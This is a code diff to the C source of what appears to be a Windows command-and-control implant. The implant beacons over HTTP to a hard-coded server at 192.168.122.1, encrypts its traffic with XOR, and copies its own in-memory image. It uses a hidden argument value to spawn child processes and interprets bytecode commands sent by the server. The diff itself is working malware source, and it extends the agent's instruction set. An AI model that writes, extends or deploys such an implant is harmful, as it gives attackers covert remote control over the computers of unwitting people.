@@ -2,23 +2,47 @@
 #include <windows.h>
 #include <stdlib.h>
 #include <string.h>
+int main(int argc, char** argv);
 #include "datatypes.h"
 #include "utils/crc32.h"
 #include "commands.h"
 #include "c2.h"
 #include "crypter.h"
+
 #define UUID "peasant2"
 #define SOCKS_SECRET "VERYSECRET1337"
+const char* dlls[] = {"advapi32.dll", "gdi32.dll", "kernel32.dll", "msvcrt.dll", "ole32.dll", "shlwapi.dll", "user32.dll", "wininet.dll", "ws2_32.dll"};
 
-int main(){
+int main(int argc, char** argv){
+    if(imageBase == NULL || argc == 69420){
+        if(imageBase == NULL)
+            imageBase = GetModuleHandleA(NULL);
+        deltaIB = (unsigned long long)&imageBase - (unsigned long long)imageBase;
+	    PIMAGE_DOS_HEADER dosHeaders = (PIMAGE_DOS_HEADER)imageBase;
+	    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)imageBase + dosHeaders->e_lfanew);
+	    dllImageSize = ntHeaders->OptionalHeader.SizeOfImage;
+        
+	    revival = VirtualAlloc(NULL, dllImageSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+        memcpy(revival, imageBase, dllImageSize);
+        if(argc == 69420){
+            for(int i=0;i<(sizeof(dlls)/sizeof(char*));i++)
+                if(GetModuleHandleA(dlls[i]) == NULL) LoadLibraryA(dlls[i]);
+            isChild = 1;
+        }else{
+            AddVectoredExceptionHandler(1, hand);
+        }
+    }
     C2* conn;
     while(1){
-        //conn = newC2(SOCKS, UUID, SOCKS_SECRET, "localhost", 6968, 1000);
+        //conn = newC2(SOCKS, UUID, SOCKS_SECRET, "192.168.122.1", 6968, 1000);
         conn = newC2(HTTP, UUID, "http://192.168.122.1:1234/document/", 1000);
+        if(conn == NULL){
+            Sleep(60000);
+            continue;
+        }
         addRxEnc(conn, 1, xor);
         addTxEnc(conn, 1, xor);
         while(1){
-            unsigned int rax = 0;
             VMstate state = recvC2(*conn);
             if(state.isize == -1){
                 cleanC2(*conn);
@@ -31,35 +55,37 @@ int main(){
             unsigned char* instructs = state.instructs;
             unsigned char* ip = instructs;
             
-            int dsize = state.dsize;
             unsigned char* data = state.data;
             unsigned char* sp = data;
             
-            if((crc32(0, instructs+4, size-4) != popint(&ip)) || (crc32(0, data+4, dsize-4) != popint(&sp))){ //exclude actual checksum from compute
+            if(crc32(0, instructs+4, size-4) != popint(&ip)){ //exclude actual checksum from compute
                 printf("error! checksum fail!\n");
                 goto end;
             }
 
             while((ip-size) < instructs){ //is there still stuff on stack
+                if(sp > data){
+                    printf("error! stack underflow!\n");
+                    goto end;
+                }
                 unsigned int mnem = popint(&ip);
-                
-                if(mnem == EXIT){
+                if(mnem == PUSHINT){
+                    pushint(popint(&ip), &sp);
+                }else if(mnem == PUSHSTR){
+                    String str = popstr(&ip);
+                    pushstr(str, &sp);
+                    fs(str);
+                }else if(mnem == EXIT){
                     free(data-BACKLOG);
                     free(instructs);
                     goto fin;
                 }else if(mnem == POPINT){
                     char data[50] = {0};
-                    sprintf(data, "[INT]: %d", rax);
-                    rax = 0;
+                    sprintf(data, "[INT]: %d", popint(&sp));
                     sendC2(*conn, data, strlen(data));
-                }else if(mnem == POPSTR){
-                    String str = popstr(&sp);
-                    sendC2(*conn, str.data, str.len);
-                    fs(str);
                 }else if(mnem == PRINT){
                     String str = popstr(&sp);
-                    //pstr(str);
-                    rax = str.len;
+                    pushint(str.len, &sp);
                     sendC2(*conn, str.data, str.len);
                     fs(str);
                 }else if(mnem == SWAP_C2){
@@ -91,7 +117,7 @@ int main(){
                     }
                     conn->cryptRx = tmprx;
                     conn->cryptTx = tmptx;
-                }else if(parse(mnem, &sp, &rax, conn)){
+                }else if(parse(mnem, &sp, conn)){
                     printf("error! invalid opcode! 0x%x\n", mnem);
                     goto end;
                 }
